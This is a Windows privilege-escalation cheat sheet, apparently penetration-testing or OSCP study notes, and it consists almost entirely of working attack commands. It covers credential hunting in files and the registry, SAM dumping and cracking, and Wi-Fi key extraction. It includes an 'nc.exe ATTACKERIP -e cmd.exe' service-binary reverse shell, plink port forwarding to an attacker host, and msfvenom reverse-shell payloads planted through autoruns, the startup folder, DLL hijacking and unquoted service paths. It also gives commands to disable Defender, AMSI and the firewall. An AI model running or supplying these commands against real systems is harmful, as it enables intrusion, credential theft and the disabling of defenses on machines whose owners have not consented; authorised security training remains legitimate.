Enumeration

# System Enumeration

systeminfo (finds: hostname / os / build number / manufacturer / architecture)
systeminfo | findstr /B /C:"ARG1" /C:"ARG2" (OS Name / OS Version / Etc)
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%

List All Drives

wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root

Hostname

wmic qfe ( Shows system and patching info Look for missing KB00000)
wmic qge get ARG1,ARG2,ARG3 (Caption, Description, HotfixID, InstalledOn)


Show Domain Controller
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName

# Scheduled Tasks

schtasks /query /fo LIST /v
cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM

# Change the upnp service binary

sc config upnphost binpath= "C:\Inetpub\nc.exe ATTACKERIP PORT -e c:\Windows\system32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost depend= ""

# User Enumeration

whoami
whoami /priv
whoami /groups
whoami /all
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name

net accounts

net user
net user USERNAME (Password expiry, groups, last logon)

net localgroup
net localgroup GROUPNAME
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource


# Network Enumeration

ipconfig 
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft

arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State

route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex

netstat -ano (shows open connections and ports/ potential port forwarding attack)

net share
powershell Find-DomainShare -ComputerDomain domain.local

reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse

# Password Hunting

findstr /si password *.txt *.ini *.config

#Find all those strings in config files.

dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.

findstr /spin "password" *.*
findstr /spin "password" *.*

In Files
These are common files to find them in. They might be base64-encoded. So look out for that.

c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini

In Registry
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

SAM and SYSTEM files

%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
Generate a hash file for John using pwdump or samdump2.

Generate a hash file for John using pwdump or samdump2

pwdump SYSTEM SAM > /root/sam.txt
samdump2 SYSTEM SAM -o sam.txt
Either crack it with john -format=NT /root/sam.txt or use Pass-The-Hash.

Search for file contents

cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*

Search for a file with a certain filename

dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini

Search the registry for key names and passwords

REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows 
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr 

reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

Read a value of a certain sub key

REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList.

Passwords in unattend.xml

dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul.

Location of the unattend.xml files.

C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

Unattend credentials are stored in base64 and can be decoded manually with base64.

$ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="  | base64 -d 
SecretSecurePassword1234*

IIS Web config

Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config

Other files

%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b

Wifi passwords

Find AP SSID

netsh wlan show profile

Get Cleartext Pass

netsh wlan show profile <SSID> key=clear

Oneliner method to extract wifi passwords from all the access point.

cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on

Sticky Notes passwords

The sticky notes app stores it's content in a sqlite db located at C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

Passwords stored in services

Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher

https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss

Powershell History

Disable Powershell history: Set-PSReadlineOption -HistorySaveStyle SaveNothing.

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
Powershell Transcript
C:\Users\<USERNAME>\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
C:\Transcripts\<DATE>\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
Password in Alternate Data Stream
PS > Get-Item -path flag.txt -Stream *
PS > Get-Content -path flag.txt -Stream Flag

# AV Enumeration

sc query windefend
sc queryex type= service

netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config

$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports

Disable Firewall

# Disable Firewall on Windows 7 via cmd
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Disable Firewall on Windows 7 via Powershell
powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`

# Disable Firewall on any windows via cmd
netsh firewall set opmode disable
netsh Advfirewall set allprofiles state off

# Windows Defender 

# check status of Defender
PS C:\> Get-MpComputerStatus

# disable scanning all downloaded files and attachments, disable AMSI (reactive)
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true

# disable AMSI (set to 0 to enable)
PS C:\> Set-MpPreference -DisableScriptScanning 1 

# exclude a folder
PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"

# remove signatures (if Internet connection is present, they will be downloaded again):
PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All

# Applocker Enumeration

PowerView PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

• Applocker Bypass
◇ https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
◇ https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md
◇ https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md

Default Writeable Folders

C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\Windows\tracing
C:\Windows\Temp
C:\Users\Public


# Automated Tools

Executables
winPEAS.exe

PowerShell
sherlock.ps1
PowerUp.ps1
jaws-enum.ps1

Other
windows-exploit-suggester.py

# Using Automated Tools

using meterpreter > upload file into c:\\windows\\tmp
run winPEAS.exe (NEEDS .NET 4.0

using meterpreter > load powershell
./PowerUp.ps1 
Invoke-PowerUp

using meterpreter > use post/multi/recon/local_exploit_suggester

Windows Exploit Suggester.py (GITHUB)

Run system info and save to a file
install dependencies
update and notate DB type

./windows-exploit-suggestoer.py --database DBFILENAME --systeminfo SYSINFOFILE.txt

This will show kernel vulns and missing patches that may be exploitable

EXPLOITS

# Kernel Exploits

A computer program that facilitates communication between hardware and software (A translator)

windows kernel exploit (GITHUB)

systeminfo
# or
wmic qfe get Caption,Description,HotFixID,InstalledOn


# Escalation with Metasploit

always try kitrap0d exploit if vulnerable!
	use windows/local/ms10_015_kitrap0d

Try others that appear if not found

# Manually Escalate (tRy HaRdEr!!)

windows exploit suggester will show potential kernel exploits

search "MSXX-XXX exploit"

# Escalating with Passwords and Port Forwarding

Enumerate. 
Look for Open ports, users, permissions, communications
Go down the line searching through available info (Privilege Escalation - Windows · Total OSCP Guide)
Look for any passwords that may appear. Try to correlate Registry queries

if 445 is open, use Plink to port forward
Download latest PLINK.exe and certutil to victim
apt install ssh (on Kali)
gedit /etc/ssh/sshd_config >> uncomment PermitRootLogin - Yes
service ssh restart
service ssh start

on victim
 plink.exe -l KALIUSER -pw KALIPW -R 445:127.0.0.1:445 ATTACKERIP

on Kali 
netstat -ano 
look for open connection to 445 (or port forwarded)

winexe -U ADMINUSERNAME%PASSWORD //VICTIM “cmd.exe”

# Windows Subsystem for Linux

Can be an excellent way to bypass windows Priv Esc protections via Linux Escalation

where /R c:\windows bash.exe
where /R c:\windows wsl.exe

if it is not a tty shell > use netsec to try to escape vis bash or python
Always check the history command

# Token Impersonation

look for the SeImpersonatePrivilege in whoami /priv
Priv2Admin (Github)
Look for: 
SeAssignPrimaryToken (potato Attacks)
SeBackup
SeDebug
SeTakeOwnership

Potato Attacks (FoxGloveSecurity)
JuicyPotato (Github)
run suggester and if you see the phrase “Potato” it is an instant win

load incognito 
list token -u
impersonate_token “TARGET”

make sure to look for ADS.

Use dir /R to find hidden datastreams

more < HIDDENFILENAME

# GetSystem

meterpreter > getsystem #instantwin

Named Pipe Impersonation (memory)
Named Pipe Impersonation (Disk)
Token Duplication - Uses SeDebug to create a .dll

# RunAs

cmdkey /list >> Shows store credentials

C:\Widows\System32\runas.exe /user:STOREDUSER /savecred “C:\Windows\System32\cmd.exe /c TYPE TARGET TO VIEW/USE (ex: C:\System32\config\SAM) > C:\Users\LOCALUSER\loot.txt"

# Registry Exploits

Autoruns

PowerUp.ps1

Powershell -ep bypass
. .\PowerUp.ps1 
Invoke-AllChecks

# Look for Autoruns
Generate a reverse shell with autorun name
 
msfvenom -p windows/shell_reverse_tcp lhost=ATTACKER lport=PORT -f exe -o AUTORUName.exe
nc -nvlp PORT

# Put malicious file on victim in autorun location
must be run by administrator (potential Schtask)

AlwaysInstallElevated

reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

# look for 0x1 in result

PowerUp.ps1

Powershell -ep bypass
. .\PowerUp.ps1 
Invoke-AllChecks

# Look for the abuse function and run that

Write-UserAddMSI
run new file created and create a new user

Net LocalGroups to verify it worked

##Alternate 

msfvenom -p windows/shell_reverse_tcp lhost=ATTACKIP lport=PORT -f msi -o NAME.msi
msfconsole > use exploit/windows/local/always_install_elevated and set existing session

Regsvc ACL

Powershell > Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
# look for -  NT Authority\Interactive Allow FullControl 

edit a .C fileto make it add a user by using the cmd below and compile it on the Kali box

system(cmd.exe /k net localgroup administrators USERNAME /add)

Move to victim and run in temp file
use CMD: 

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ \d c:\temp\FILE.exe /f

 start malicious file using 
 
 sc start regsvc
 
 # Executable Files
 
 run PowerUp and look for Service Executables and Argument Permissions
Notate vulnerable executables

edit a .C fileto make it add a user by using the cmd below and compile it on the Kali box

system(cmd.exe /k net localgroup administrators USERNAME /add)

Move to victim and run in temp file
use CMD: 

save it in the path to overwrite the vulnerable program

# Start-Up Applications

Go to CMD 
icacls.exe “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”

look for files the haveFull Access (F) for the BUILTIN\users group

Generate a malicious file using MSFVenom

msfvenom -p windows/shell_reverse_tcp LHOSTIPADDRESS LPORT=PORT -f exe -o FILENAME.exe
Start a listener with these details
nc -nvlp PORT

Move exe to startup folder on victim and wait for machine to startup

# DLL Hijacking

PowerSploit may be able to mising or incorrectly placed DLL's
Path must be writeable to exploit these vulnerabilites

msfvenom -p windows/shell_reverse_tcp LHOSTIPADDRESS LPORT=PORT -f dll -o FILENAME.dll

OR 

edit a .C fileto make it add a user by using the cmd below and compile it on the Kali box

system(cmd.exe /k net localgroup administrators USERNAME /add)

Move to victim and run into the dll servicepath and replace the vulnerable exploit

# Service Permisions and Paths

Binary Path Exploitation

run PowerUp.ps1 and Invoke-AllChecks
OR, if Sysinternals is on the machine
accesschk64.exe -uwcv Everyone *
accesschk64.exe -uwcv SERVICENAME

Identify where you have Read/Write permissions
Can you restart the service? You control it
 Locate the Binary Path Service using sc query SERVICE NAME
 * if the “SERVICE_CHANE_CONFIG” option is available:

sc config SERVICENAME binpath="net localgroup administrators USERNAME /add"

Unquoted Service Paths
 
run program to look for vulns (PowerUp/WinPEAS/etc)
Identify service paths with spaces in them and no “”
(ie: C:\Program Files)

 use MSFVenom to create new malicious file names “Program” (above example; change based on path name)
 
 msfvenom -p windows/shell_reverse_tcp LHOSTIPADDRESS LPORT=PORT -f exe -o Program.exe
 
 Move file to victim in the path where the original weakness is found
 start/restart the service
 
 # CVE-2019-1388
 
 If the hhupd file is present on a system (or you can PUT it on the system)
 run as administrator
 a UAC prompt will appear telling you that you are unable to perform this function
 View certificate info and IE will launch as System
 Save page as c:\windows\system32\*.* and hit enter
 You know have access to the file system and can select cmd.exe > run as administrator
 Now you have an Admin Shell
